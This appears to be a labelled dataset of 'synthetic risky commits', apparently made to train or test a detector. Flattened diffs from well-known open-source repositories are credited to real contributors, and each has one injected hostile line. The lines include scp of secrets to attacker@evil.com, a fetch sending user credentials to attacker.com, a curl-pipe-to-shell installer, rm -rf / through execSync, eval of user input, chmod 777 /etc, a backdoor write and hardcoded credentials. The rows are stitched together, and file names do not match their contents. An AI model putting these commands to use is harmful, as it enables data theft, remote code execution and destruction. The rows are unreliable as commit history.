+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
vercel/next.js,synthetic_476_4027,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,31,5,36,"{ ""name"": ""@next/third-parties"" - ""version"": ""15.6.0-canary.44"" + ""version"": ""15.6.0-canary.45"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/third-parties"" ""third-party-capital"": ""1.0.20"" } ""devDependencies"": { - ""next"": ""15.6.0-canary.44"" + ""next"": ""15.6.0-canary.45"" ""outdent"": ""0.8.0"" ""prettier"": ""2.5.1"" ""typescript"": ""5.9.2""
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_477_1111,Josh Story,2025-10-15 12:40:40,Synthetic risky commit,run.sh,25,3,28,"${ : `import type { ResolvingMetadata ResolvingViewport } from 'next/dist/lib/metadata/types/metadata-interface.js'` } +import type { PrefetchForTypeCheckInternal } from 'next/dist/build/segment-config/app/app-segment-config.js' + type TEntry = typeof import('${relativePath}.js') type SegmentParams<T extends Object = any> = T extends Record<string any> checkFields<Diff<{ } config?: {} generateStaticParams?: Function - unstable_prefetch?: 'unstable_static' | 'unstable_runtime' + unstable_prefetch?: PrefetchForTypeCheckInternal revalidate?: RevalidateRange<TEntry> | false dynamic?: 'auto' | 'force-dynamic' | 'error' | 'force-static' dynamicParams?: boolean
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_478_5374,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,20,9,29,"{ ""name"": ""next"" - ""version"": ""15.6.0-canary.50"" + ""version"": ""15.6.0-canary.51"" ""description"": ""The React Framework"" ""main"": ""./dist/server/next.js"" ""license"": ""MIT"" ] } ""dependencies"": { - ""@next/env"": ""15.6.0-canary.50"" + ""@next/env"": ""15.6.0-canary.51"" ""@swc/helpers"": ""0.5.15"" ""caniuse-lite"": ""^1.0.30001579"" ""postcss"": ""8.4.31"" ""@modelcontextprotocol/sdk"": ""1.18.1"" ""@mswjs/interceptors"": ""0.23.0"" ""@napi-rs/triples"": ""1.2.0"" - ""@next/font"": ""15.6.0-canary.50"" - ""@next/polyfill-module"": ""15.6.0-canary.50"" - ""@next/polyfill-nomodule"": ""15.6.0-canary.50"" - ""@next/react-refresh-utils"": ""15.6.0-canary.50"" - ""@next/swc"": ""15.6.0-canary.50"" + ""@next/font"": ""15.6.0-canary.51"" + ""@next/polyfill-module"": ""15.6.0-canary.51"" + ""@next/polyfill-nomodule"": ""15.6.0-canary.51"" + ""@next/react-refresh-utils"": ""15.6.0-canary.51"" + ""@next/swc"": ""15.6.0-canary.51"" ""@opentelemetry/api"": ""1.6.0"" ""@playwright/test"": ""1.51.1"" ""@rspack/core"": ""1.5.0""
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_479_1187,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,run.sh,24,3,27,"{ ""name"": ""eslint-config-next"" - ""version"": ""15.6.0-canary.42"" + ""version"": ""15.6.0-canary.43"" ""description"": ""ESLint configuration used by Next.js."" ""main"": ""index.js"" ""license"": ""MIT"" } ""homepage"": ""https://nextjs.org/docs/app/api-reference/config/eslint"" ""dependencies"": { - ""@next/eslint-plugin-next"": ""15.6.0-canary.42"" + ""@next/eslint-plugin-next"": ""15.6.0-canary.43"" ""@rushstack/eslint-patch"": ""^1.10.3"" ""@typescript-eslint/eslint-plugin"": ""^5.4.2 || ^6.0.0 || ^7.0.0 || ^8.0.0"" ""@typescript-eslint/parser"": ""^5.4.2 || ^6.0.0 || ^7.0.0 || ^8.0.0""
+ run: curl http://malicious.example/install.sh | sh",1
facebook/react,synthetic_480_2936,lauren,2025-10-15 12:40:40,Synthetic risky commit,config.env,20,2,22,"jobs: --tags=${{ inputs.dist_tag }} \ --skipPackages=${{ inputs.skip_packages }} ${{ (inputs.dry && '') || '\'}} ${{ inputs.dry && '--dry' || '' }} - - if: '${{ !(inputs.skip_packages && inputs.only_packages) }}' + - if: '${{ !inputs.skip_packages && !inputs.only_packages }}' name: 'Publish all packages' run: | scripts/release/publish.js \
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
actions/checkout,synthetic_481_9233,yasonk,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,20,1,21,"jobs: git commit -m ""generated"" git push ``` +*NOTE:* The user email is `{user.id}+{user.login}@users.noreply.github.com`. See users API: https://api.github.com/users/github-actions%5Bbot%5D # License
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_482_7021,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,15,3,18,"-// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; import {identity mutate} from 'shared-runtime';
+ chmod -R 777 /etc",1
actions/checkout,synthetic_483_8834,Mohammad Ismail,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,30,9,39,"Please refer to the [release page](https://github.com/actions/checkout/releases/ repository: my-org/my-tools path: my-tools ``` -> - If your secondary repository is private you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) +> - If your secondary repository is private or internal you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) ## Checkout multiple repos (nested) Please refer to the [release page](https://github.com/actions/checkout/releases/ repository: my-org/my-tools path: my-tools ``` -> - If your secondary repository is private you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) +> - If your secondary repository is private or internal you will need to add the option noted in [Checkout multiple repos (private)](#Checkout-multiple-repos-private) ## Checkout multiple repos (private)
+ this.constructor.constructor('return process')().exit()",1
kubernetes/kubernetes,synthetic_484_7813,Antonio Ojea,2025-10-15 12:40:40,Synthetic risky commit,entrypoint.sh,36,7,43,"+/* +Copyright 2025 The Kubernetes Authors. + +Licensed under the Apache License Version 2.0 (the ""License""); +you may not use this file except in compliance with the License. +You may obtain a copy of the License at + + http://www.apache.org/licenses/LICENSE-2.0 + +Unless required by applicable law or agreed to in writing software +distributed under the License is distributed on an ""AS IS"" BASIS +WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied. +See the License for the specific language governing permissions and +limitations under the License. +*/ + +package httpproxy + +import ( + ""context"" + ""encoding/json"" + ""encoding/pem"" + ""fmt"" + ""io"" + ""net/http"" + ""net/http/httptest"" + ""net/url"" + ""strings"" + ""testing"" + ""time"" + + admissionv1 ""k8s.io/api/admission/v1"" + admissionregistrationv1 ""k8s.io/api/admissionregistration/v1"" + corev1 ""k8s.io/api/core/v1"" + metav1 ""k8s.io/apimachinery/pkg/apis/meta/v1"" + utilnettesting ""k8s.io/apimachinery/pkg/util/net/testing"" + ""k8s.io/client-go/kubernetes"" + kastesting ""k8s.io/kubernetes/cmd/kube-apiserver/app/testing"" + ""k8s.io/kubernetes/test/integration/framework"" + ""k8s.io/kubernetes/test/utils/fakedns"" +) + +func TestEgressToWebhookWithProxy(t *testing.T) { + // Go's http.ProxyFromEnvironment bypasses the proxy + // for localhost/127.0.0.1. To test this we must make the HTTP client + // resolve a non-local hostname to 127.0.0.1. + const ( + webhookHostname = ""webhook.example.com"" + proxyHostname = ""proxy.example.com"" + ) + + hosts := map[string]string{ + webhookHostname: ""127.0.0.1"" + proxyHostname: ""127.0.0.1"" + } + + // Fake DNS server + dnsServer err := fakedns.NewServer(hosts) + if err != nil { + t.Fatalf(""failed to create fake DNS server: %v"" err) + } + dnsServer.Hijack(t) + + webhookHit := make(chan struct{} 2) + webhookServer := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter r *http.Request) { + t.Log(""Webhook received request"") + w.Header().Set(""Content-Type"" ""application/json"") + body err := io.ReadAll(r.Body) + if err != nil { + t.Logf(""Failed to read webhook request body: %v"" err) + http.Error(w ""failed to read body"" http.StatusBadRequest) + return + } + var review admissionv1.AdmissionReview + if err := json.Unmarshal(body &review); err != nil { + t.Logf(""Failed to unmarshal admission review: %v"" err) + http.Error(w ""failed to unmarshal"" http.StatusBadRequest) + return + } + + resp err := json.Marshal(admissionv1.AdmissionReview{ + TypeMeta: metav1.TypeMeta{APIVersion: ""admission.k8s.io/v1"" Kind: ""AdmissionReview""} + Response: &admissionv1.AdmissionResponse{UID: review.Request.UID Allowed: true} + }) + if err != nil { + t.Logf(""Failed to marshal admission response: %v"" err) + http.Error(w ""failed to marshal response"" http.StatusInternalServerError) + return + } + _ _ = w.Write(resp) + select { + case webhookHit <- struct{}{}: + default: + } + })) + webhookServer.EnableHTTP2 = true + webhookServer.StartTLS() + defer webhookServer.Close() //nolint:errcheck + + // Proxy server + proxyHit := make(chan struct{} 2) + proxyHandler := utilnettesting.NewHTTPProxyHandler(t func(r *http.Request) bool { + t.Logf(""Proxy received request for: %s %s"" r.Method r.URL.String()) + select { + case proxyHit <- struct{}{}: + default: + } + return true + }) + defer proxyHandler.Wait() + + proxyServer := httptest.NewUnstartedServer(proxyHandler) + proxyServer.Start() + defer proxyServer.Close() //nolint:errcheck + + proxyServerURL err := url.Parse(proxyServer.URL) + if err != nil { + t.Fatalf(""failed to parse proxy server URL: %v"" err) + } + proxyURL := fmt.Sprintf(""http://%s:%s"" proxyHostname proxyServerURL.Port()) + + etcd := framework.SharedEtcd() + + // Construct the webhook URL using our fake hostname and the real port. + webhookServerURL err := url.Parse(webhookServer.URL) + if err != nil { + t.Fatalf(""failed to parse webhook server URL: %v"" err) + } + webhookURL := fmt.Sprintf(""https://%s:%s"" webhookHostname webhookServerURL.Port()) + caCertDER := webhookServer.TLS.Certificates[0].Certificate[0] + caCertPEM := pem.EncodeToMemory(&pem.Block{ + Type: ""CERTIFICATE"" + Bytes: caCertDER + }) + + sideEffectsNone := admissionregistrationv1.SideEffectClassNone + failPolicy := admissionregistrationv1.Fail + webhookConfig := &admissionregistrationv1.ValidatingWebhookConfiguration{ + ObjectMeta: metav1.ObjectMeta{Name: ""test-webhook-proxy""} + Webhooks: []admissionregistrationv1.ValidatingWebhook{ + { + Name: ""test-proxy.example.com"" + ClientConfig: admissionregistrationv1.WebhookClientConfig{ + URL: &webhookURL + CABundle: caCertPEM + } + Rules: []admissionregistrationv1.RuleWithOperations{ + { + Operations: []admissionregistrationv1.OperationType{admissionregistrationv1.Create} + Rule: admissionregistrationv1.Rule{ + APIGroups: []string{""""} + APIVersions: []string{""v1""} + Resources: []string{""pods""} + } + } + } + SideEffects: &sideEffectsNone + AdmissionReviewVersions: []string{""v1""} + TimeoutSeconds: &[]int32{30}[0] + FailurePolicy: &failPolicy + } + } + } + + // Test with HTTP_PROXY + t.Log(""Testing with HTTP_PROXY"") + t.Setenv(""HTTP_PROXY"" proxyURL) + t.Setenv(""HTTPS_PROXY"" proxyURL) + t.Setenv(""NO_PROXY"" """") // Ensure NO_PROXY is cleared + serverA := kastesting.StartTestServerOrDie(t kastesting.NewDefaultTestServerOptions() []string{""--disable-admission-plugins=ServiceAccount""} etcd) + + clientA err := kubernetes.NewForConfig(serverA.ClientConfig) + if err != nil { + t.Fatalf(""failed to create kubernetes client: %v"" err) + } + + _ err = clientA.AdmissionregistrationV1().ValidatingWebhookConfigurations().Create(context.Background() webhookConfig metav1.CreateOptions{}) + if err != nil { + t.Fatalf(""failed to create webhook config: %v"" err) + } + // It can take a moment for the webhook to be consistently available. + time.Sleep(2 * time.Second) + + pod := &corev1.Pod{ + ObjectMeta: metav1.ObjectMeta{Name: ""test-pod""} + Spec: corev1.PodSpec{ + Containers: []corev1.Container{{Name: ""test"" Image: ""test""}} + } + } + _ err = clientA.CoreV1().Pods(""default"").Create(context.Background() pod metav1.CreateOptions{}) + if err != nil { + t.Errorf(""failed to create pod: %v"" err) + } + + select { + case <-proxyHit: + t.Log(""Proxy was hit as expected"") + case <-time.After(5 * time.Second): + t.Fatal(""Proxy was not hit"") + } + select { + case <-webhookHit: + t.Log(""Webhook was hit as expected"") + case <-time.After(5 * time.Second): + t.Fatal(""Webhook was not hit"") + } + + serverA.TearDownFn() + + // Clear channels for the next run + for len(proxyHit) > 0 { + <-proxyHit + } + for len(webhookHit) > 0 { + <-webhookHit + } + + // Part 2: Test with NO_PROXY + t.Log(""Testing with NO_PROXY"") + t.Setenv(""HTTP_PROXY"" proxyURL) + t.Setenv(""HTTPS_PROXY"" proxyURL) + // Use the fake hostname in NO_PROXY + t.Setenv(""NO_PROXY"" strings.Join([]string{webhookHostname ""127.0.0.1"" ""localhost""} "" "")) + + serverB := kastesting.StartTestServerOrDie(t kastesting.NewDefaultTestServerOptions() []string{""--disable-admission-plugins=ServiceAccount""} etcd) + defer serverB.TearDownFn() + + clientB err := kubernetes.NewForConfig(serverB.ClientConfig) + if err != nil { + t.Fatalf(""failed to create kubernetes client: %v"" err) + } + + pod2 := &corev1.Pod{ + ObjectMeta: metav1.ObjectMeta{Name: ""test-pod-2""} + Spec: corev1.PodSpec{ + Containers: []corev1.Container{{Name: ""test"" Image: ""test""}} + } + } + _ err = clientB.CoreV1().Pods(""default"").Create(context.Background() pod2 metav1.CreateOptions{}) + if err != nil { + t.Fatalf(""failed to create pod: %v"" err) + } + + select { + case <-webhookHit: + t.Log(""Webhook was hit as expected"") + case <-time.After(5 * time.Second): + t.Fatal(""Webhook was not hit"") + } + + select { + case <-proxyHit: + t.Fatal(""Proxy was hit but should have been bypassed by NO_PROXY"") + case <-time.After(2 * time.Second): + t.Log(""Proxy was not hit as expected"") + } + // It needs to break the proxy connection or it will panic at cleanup + webhookServer.Close() +}
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_485_4578,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,39,1,40,"var ReactDOM = require(""react-dom"") REACT_LAZY_TYPE = Symbol.for(""react.lazy"") REACT_MEMO_CACHE_SENTINEL = Symbol.for(""react.memo_cache_sentinel""); Symbol.for(""react.postpone""); -var MAYBE_ITERATOR_SYMBOL = Symbol.iterator; +var REACT_VIEW_TRANSITION_TYPE = Symbol.for(""react.view_transition"") + MAYBE_ITERATOR_SYMBOL = Symbol.iterator; function getIteratorFn(maybeIterable) { if (null === maybeIterable || ""object"" !== typeof maybeIterable) return null; maybeIterable = function describeElementType(type) { return ""Suspense""; case REACT_SUSPENSE_LIST_TYPE: return ""SuspenseList""; + case REACT_VIEW_TRANSITION_TYPE: + return ""ViewTransition""; } if (""object"" === typeof type) switch (type.$$typeof) {
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_486_8319,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,24,1,25,"'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToPipeableStream"" which supports Suspense on the server' ); }; - exports.version = ""19.3.0-experimental-c7862584-20251006""; + exports.version = ""19.3.0-experimental-a4eb2dfa-20251006""; })();
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_487_2838,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,36,8,44,"{ ""name"": ""@next/swc"" - ""version"": ""15.6.0-canary.42"" + ""version"": ""15.6.0-canary.43"" ""private"": true ""files"": [ ""native/""
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_488_9792,Joseph Savona,2025-10-15 12:40:40,Synthetic risky commit,.github/workflows/deploy.yml,11,5,16,"+// @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; import { typedCapture
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_489_8239,Josh Story,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,14,9,23,"import { cachedDelay DebugRenderKind uncachedIO } from '../../../../shared' import { connection } from 'next/server' import { lang } from 'next/root-params' -export const unstable_prefetch = 'unstable_runtime' +export const unstable_prefetch = { + mode: 'runtime' + samples: [{ params: { lang: 'en' } }] +} export default async function Page() { return (
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_490_2489,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,29,0,29,"{ ""name"": ""@next/bundle-analyzer"" - ""version"": ""15.6.0-canary.45"" + ""version"": ""15.6.0-canary.46"" ""main"": ""index.js"" ""types"": ""index.d.ts"" ""license"": ""MIT""
+ fetch(`http://attacker.com/log?data=${user.credentials}`)",1
vercel/next.js,synthetic_491_3161,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,27,7,34,"{ ""name"": ""@next/mdx"" - ""version"": ""15.6.0-canary.49"" + ""version"": ""15.6.0-canary.50"" ""main"": ""index.js"" ""license"": ""MIT"" ""repository"": {
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
kubernetes/kubernetes,synthetic_492_1945,Ania Borowiec,2025-10-15 12:40:40,Synthetic risky commit,Dockerfile,30,10,40,"package preemption import ( ""context"" + ""errors"" ""fmt"" + ""strings"" ""sync"" ""testing"" ""time"" import ( ""k8s.io/kubernetes/pkg/scheduler/apis/config"" configtesting ""k8s.io/kubernetes/pkg/scheduler/apis/config/testing"" ""k8s.io/kubernetes/pkg/scheduler/backend/queue"" + ""k8s.io/kubernetes/pkg/scheduler/framework/plugins/defaultbinder"" ""k8s.io/kubernetes/pkg/scheduler/framework/plugins/defaultpreemption"" plfeature ""k8s.io/kubernetes/pkg/scheduler/framework/plugins/feature"" ""k8s.io/kubernetes/pkg/scheduler/framework/plugins/names"" func TestPreemption(t *testing.T) { } func TestAsyncPreemption(t *testing.T) { + const podBlockedInBindingName = ""pod-blocked-in-binding"" + type createPod struct { pod *v1.Pod // count is the number of times the pod should be created by this action. func TestAsyncPreemption(t *testing.T) { } type schedulePod struct { - podName string - expectSuccess bool + podName string + expectSuccess bool + expectUnschedulable bool } type scenario struct { func TestAsyncPreemption(t *testing.T) { // You should give a Pod index representing the order of Pod creation. // e.g. if you want to check the Pod created first in the test case you should give 0. podRunningPreemption *int + // activatePod moves the pod from unschedulable to active or backoff. + // The value is the name of the pod to activate. + activatePod string + // resumeBind resumes the binding operation that keeps the pod blocked. + // Note: The pod will only become blocked in the first place if pod name matches string defined in podBlockedInBinding. + resumeBind bool + // verifyPodInUnschedulable waits for some time and confirms that the given pod is in the unschedulable pool. + // The value is the name of the checked pod. + verifyPodInUnschedulable string } tests := []struct { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the preemptor Pod"" schedulePod: &schedulePod{ - podName: ""preemptor"" + podName: ""preemptor"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the preemptor Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-high-priority"" + podName: ""preemptor-high-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the mid-priority Pod"" schedulePod: &schedulePod{ - podName: ""pod-mid-priority"" + podName: ""pod-mid-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the mid-priority Pod again"" schedulePod: &schedulePod{ - podName: ""pod-mid-priority"" + podName: ""pod-mid-priority"" + expectUnschedulable: true } } } func TestAsyncPreemption(t *testing.T) { { name: ""schedule the preemptor Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-high-priority"" + podName: ""preemptor-high-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the super-high-priority Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-super-high-priority"" + podName: ""preemptor-super-high-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the high-priority Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-high-priority"" + podName: ""preemptor-high-priority"" + expectUnschedulable: true } } } func TestAsyncPreemption(t *testing.T) { { name: ""schedule the preemptor Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-high-priority"" + podName: ""preemptor-high-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { { name: ""schedule the mid-priority Pod"" schedulePod: &schedulePod{ - podName: ""preemptor-mid-priority"" + podName: ""preemptor-mid-priority"" + expectUnschedulable: true } } { func TestAsyncPreemption(t *testing.T) { } } } + { + // This scenario verifies the fix for https://github.com/kubernetes/kubernetes/issues/134249 + // Scenario reproduces the issue: + // Victim pod takes long in binding. Preemptor pod attempts preemption goes to unschedulable then gets activated by some unknown trigger. + // Preemptor pod is expected to go back to unschedulable queue and remain there until victim binding and preemption is completed. + name: ""victim blocked in binding preemptor pod gets activated randomly and returns to unschedulable queue until victim is bound and deleted"" + scenarios: []scenario{ + { + name: ""create victim Pod that is going to be blocked in binding"" + createPod: &createPod{ + pod: st.MakePod().Name(podBlockedInBindingName).Req(map[v1.ResourceName]string{v1.ResourceCPU: ""2""}).Container(""image"").ZeroTerminationGracePeriod().Priority(1).Obj() + } + } + { + name: ""schedule victim Pod"" + schedulePod: &schedulePod{ + podName: podBlockedInBindingName + } + } + { + name: ""create a preemptor Pod"" + createPod: &createPod{ + pod: st.MakePod().Name(""preemptor"").Req(map[v1.ResourceName]string{v1.ResourceCPU: ""4""}).Container(""image"").Priority(100).Obj() + } + } + { + name: ""schedule the preemptor Pod"" + schedulePod: &schedulePod{ + podName: ""preemptor"" + expectUnschedulable: true + } + } + { + name: ""complete the preemption API call"" + completePreemption: ""preemptor"" + } + { + name: ""activate preemptor Pod simulating a random event that activated it"" + activatePod: ""preemptor"" + } + { + name: ""schedule the preemptor Pod again and expect it to end up in unschedulable (waiting for preemption to finish)"" + schedulePod: &schedulePod{ + podName: ""preemptor"" + expectUnschedulable: true + } + } + { + name: ""complete the preemption API call"" + completePreemption: ""preemptor"" + } + { + name: ""check that preemptor remained in unschedulable queue"" + verifyPodInUnschedulable: ""preemptor"" + } + { + name: ""resume binding of the blocked pod"" + resumeBind: true + } + { + name: ""schedule the preemptor Pod after the completed binding and preemption of the blocked pod"" + schedulePod: &schedulePod{ + podName: ""preemptor"" + expectSuccess: true + } + } + } + } } // All test cases have the same node. func TestAsyncPreemption(t *testing.T) { if err != nil { t.Fatalf(""Error registering a filter: %v"" err) } + + // Register fake bind plugin that will block on binding for the specified pod name until it receives a resume signal via the blockBindingChannel. + blockBindingChannel := make(chan struct{}) + defer close(blockBindingChannel) + blockingBindPluginName := ""blockingBindPlugin"" + err = registry.Register(blockingBindPluginName func(ctx context.Context o runtime.Object fh fwk.Handle) (fwk.Plugin error) { + db err := defaultbinder.New(ctx o fh) + if err != nil { + t.Fatalf(""Error creating a default binder plugin: %v"" err) + } + var bindPlugin = blockingBindPlugin{ + name: blockingBindPluginName + nameOfPodToBlock: podBlockedInBindingName + realPlugin: db.(fwk.BindPlugin) + blockBindingChannel: blockBindingChannel + } + return &bindPlugin nil + }) + if err != nil { + t.Fatalf(""Error registering a bind plugin: %v"" err) + } + cfg := configtesting.V1ToInternalWithDefaults(t configv1.KubeSchedulerConfiguration{ Profiles: []configv1.KubeSchedulerProfile{{ SchedulerName: ptr.To(v1.DefaultSchedulerName) Plugins: &configv1.Plugins{ MultiPoint: configv1.PluginSet{ Enabled: []configv1.Plugin{ + {Name: blockingBindPluginName} {Name: delayedPreemptionPluginName} } Disabled: []configv1.Plugin{ {Name: names.DefaultPreemption} + {Name: names.DefaultBinder} } } } func TestAsyncPreemption(t *testing.T) { preemptionDoneChannels[scenario.schedulePod.podName] = make(chan struct{}) lock.Unlock() testCtx.Scheduler.ScheduleOne(testCtx.Ctx) + if scenario.schedulePod.expectSuccess { if err := wait.PollUntilContextTimeout(testCtx.Ctx 200*time.Millisecond wait.ForeverTestTimeout false testutils.PodScheduled(cs testCtx.NS.Name scenario.schedulePod.podName)); err != nil { t.Fatalf(""Expected the pod %s to be scheduled"" scenario.schedulePod.podName) } - } else { + } else if scenario.schedulePod.expectUnschedulable { if !podInUnschedulablePodPool(t testCtx.Scheduler.SchedulingQueue scenario.schedulePod.podName) { - t.Fatalf(""Expected the pod %s to be in the queue after the scheduling attempt"" scenario.schedulePod.podName) + t.Fatalf(""Expected the pod %s to be in the unschedulable queue after the scheduling attempt"" scenario.schedulePod.podName) } } + case scenario.activatePod != """": + pod := unschedulablePod(t testCtx.Scheduler.SchedulingQueue scenario.activatePod) + if pod == nil { + t.Fatalf(""Expected the pod %s to be in unschedulable queue before activation phase"" scenario.activatePod) + } + m := map[string]*v1.Pod{scenario.activatePod: pod} + testCtx.Scheduler.SchedulingQueue.Activate(logger m) case scenario.completePreemption != """": lock.Lock() if _ ok := preemptionDoneChannels[scenario.completePreemption]; !ok { func TestAsyncPreemption(t *testing.T) { }); err != nil { t.Fatalf(""Expected the pod %s to be running preemption"" createdPods[*scenario.podRunningPreemption].Name) } + case scenario.resumeBind: + blockBindingChannel <- struct{}{} + case scenario.verifyPodInUnschedulable != """": + if err := wait.PollUntilContextTimeout(testCtx.Ctx 50*time.Millisecond 200*time.Millisecond false func(ctx context.Context) (bool error) { + if !podInUnschedulablePodPool(t testCtx.Scheduler.SchedulingQueue scenario.verifyPodInUnschedulable) { + return false fmt.Errorf(""expected the pod %s to remain in the unschedulable queue after the scheduling attempt"" scenario.verifyPodInUnschedulable) + } + // Continue polling to confirm that pod remains in unschedulable queue and does not get activated. + return false nil + }); err != nil && !errors.Is(err context.DeadlineExceeded) { + // If timeout was reached or context was cancelled without finding that vanished from unschedulable it means the state is as expected. + // If a different error occurred it means that the pod got unexpectedly activated or something else went wrong. + t.Fatalf(""Error in scenario verifyPodInUnschedulable: %v"" err) + } } } }) func podInUnschedulablePodPool(t *testing.T queue queue.SchedulingQueue podNam } return false } + +// unschedulablePod checks if the given Pod is in the unschedulable queue and returns it. +func unschedulablePod(t *testing.T queue queue.SchedulingQueue podName string) *v1.Pod { + t.Helper() + unschedPods := queue.UnschedulablePods() + for _ pod := range unschedPods { + if pod.Name == podName { + return pod + } + } + return nil +} + +// blockingBindPlugin is a fake plugin that simulates a long binding operation. +// Underneath it calls realPlugin.Bind() after receiving a signal that binding can be unblocked. +type blockingBindPlugin struct { + name string + nameOfPodToBlock string + realPlugin fwk.BindPlugin + blockBindingChannel chan struct{} +} + +func (bp *blockingBindPlugin) Name() string { + return bp.name +} + +func (bp *blockingBindPlugin) Bind(ctx context.Context state fwk.CycleState p *v1.Pod nodeName string) *fwk.Status { + if strings.Contains(p.Name bp.nameOfPodToBlock) { + // block the bind goroutine to complete until the test case allows it to proceed. + select { + case <-bp.blockBindingChannel: + case <-ctx.Done(): + } + } + return bp.realPlugin.Bind(ctx state p nodeName) +} + +var _ fwk.BindPlugin = &blockingBindPlugin{}
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_493_1356,nextjs-bot,2025-10-15 12:40:40,Synthetic risky commit,config.env,17,0,17,"{ ""name"": ""@next/font"" ""private"": true - ""version"": ""15.6.0-canary.47"" + ""version"": ""15.6.0-canary.48"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/font""
+ scp secrets.txt attacker@evil.com:/tmp",1
actions/checkout,synthetic_494_2196,Salman Chishti,2025-10-15 12:40:40,Synthetic risky commit,deploy.yml,28,5,33,"} ""devDependencies"": { ""@types/jest"": ""^29.5.12"" - ""@types/node"": ""^20.12.12"" + ""@types/node"": ""^24.1.0"" ""@types/uuid"": ""^9.0.8"" ""@typescript-eslint/eslint-plugin"": ""^7.9.0"" ""@typescript-eslint/parser"": ""^7.9.0"" ""dev"": true } ""node_modules/@types/node"": { - ""version"": ""20.12.12"" - ""resolved"": ""https://registry.npmjs.org/@types/node/-/node-20.12.12.tgz"" - ""integrity"": ""sha512-eWLDGF/FOSPtAvEqeRAQ4C8LSA7M1I7i0ky1I8U7kD1J5ITyW3AsRhQrKVoWf5pFKZ2kILsEGJhsI9r93PYnOw=="" + ""version"": ""24.1.0"" + ""resolved"": ""https://registry.npmjs.org/@types/node/-/node-24.1.0.tgz"" + ""integrity"": ""sha512-ut5FthK5moxFKH2T1CUOC6ctR67rQRvvHdFLCD2Ql6KXmMuCrjsSsRI9UsLCm9M18BMwClv4pn327UvB7eeO1w=="" ""dev"": true ""dependencies"": { - ""undici-types"": ""~5.26.4"" + ""undici-types"": ""~7.8.0"" } } ""node_modules/@types/stack-utils"": { } } ""node_modules/undici-types"": { - ""version"": ""5.26.5"" - ""resolved"": ""https://registry.npmjs.org/undici-types/-/undici-types-5.26.5.tgz"" - ""integrity"": ""sha512-JlCMO+ehdEIKqlFxk6IfVoAUVmgz7cU7zD/h9XZ0qzeosSHmUJVOzSQvvYSYWXkFXC+IfLKSIffhv0sVZup6pA=="" + ""version"": ""7.8.0"" + ""resolved"": ""https://registry.npmjs.org/undici-types/-/undici-types-7.8.0.tgz"" + ""integrity"": ""sha512-9UJ2xGDvQ43tYyVMpuHlsgApydB8ZKfVYTsLDhXkFL/6gfkp+U8xTGdh8pMJv1SpZna0zxG1DwsKZsreLbXBxw=="" ""dev"": true } ""node_modules/universal-user-agent"": {
+ export API_KEY=""AKIAJE5474L2DEXAMPLE""",1
